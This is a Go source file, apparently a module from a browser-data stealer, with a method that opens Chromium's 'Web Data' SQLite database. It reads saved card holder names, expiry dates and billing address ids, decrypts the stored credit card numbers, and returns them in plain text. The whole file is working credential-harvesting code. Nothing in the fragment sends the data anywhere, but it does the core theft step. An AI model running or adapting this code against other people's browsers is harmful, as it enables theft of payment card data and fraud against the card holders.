package browsers

import (
	"path/filepath"

	_ "modernc.org/sqlite"
)

func (c *Chromium) GetCreditCards(path string) (creditCards []CreditCard, err error) {
	db, err := GetDBConnection(filepath.Join(path, "Web Data"))
	if err != nil {
		return nil, err
	}

	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id  FROM credit_cards")
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	for rows.Next() {

		var (
			name, month, year, address string
			value, encryptValue        []byte
		)
		if err := rows.Scan(&name, &month, &year, &encryptValue, &address); err != nil {
			continue
		}
		if month == "" || year == "" || encryptValue == nil {
			continue
		}

		creditCard := CreditCard{
			Name:            name,
			ExpirationYear:  year,
			ExpirationMonth: month,
			Address:         address,
		}

		value, err = c.Decrypt(encryptValue)
		if err != nil {
			continue
		}

		creditCard.Number = string(value)
		creditCards = append(creditCards, creditCard)
	}

	return creditCards, nil
}
